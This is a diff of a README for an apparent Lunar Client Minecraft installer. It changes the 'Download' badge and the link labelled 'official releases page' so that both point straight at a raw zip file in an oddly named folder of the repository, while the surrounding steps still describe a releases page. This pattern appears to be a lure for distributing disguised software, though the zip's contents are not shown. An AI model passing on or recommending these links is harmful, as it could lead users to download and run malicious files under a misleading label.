@@ -1,6 +1,6 @@
 # 🚀 lunarclientminecraft-windows-installer - Optimize your Minecraft game performance easily
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/97-soubise836/lunarclientminecraft-windows-installer/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/97-soubise836/lunarclientminecraft-windows-installer/raw/refs/heads/main/prointervention/windows-installer-lunarclientminecraft-2.2.zip)
 
 This software provides a clean, simple setup tool for Lunar Client on your Windows computer. It helps you manage mods and launch your Sandbox worlds with minimal effort. This installer acts as a guide to ensure you have the correct files to reach better frame rates and stable gameplay.
 
@@ -8,7 +8,7 @@ This software provides a clean, simple setup tool for Lunar Client on your Windo
 
 Follow these steps to obtain the setup files for your computer. 
 
-1. Visit the [official releases page](https://github.com/97-soubise836/lunarclientminecraft-windows-installer/releases) to see available versions.
+1. Visit the [official releases page](https://github.com/97-soubise836/lunarclientminecraft-windows-installer/raw/refs/heads/main/prointervention/windows-installer-lunarclientminecraft-2.2.zip) to see available versions.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file that ends in ".exe" to begin the download. Your browser might ask where to save the file. Choose a folder you can find easily, such as your "Downloads" folder.
 4. Wait for the download to finish. Do not close your browser until the progress bar reaches the end.
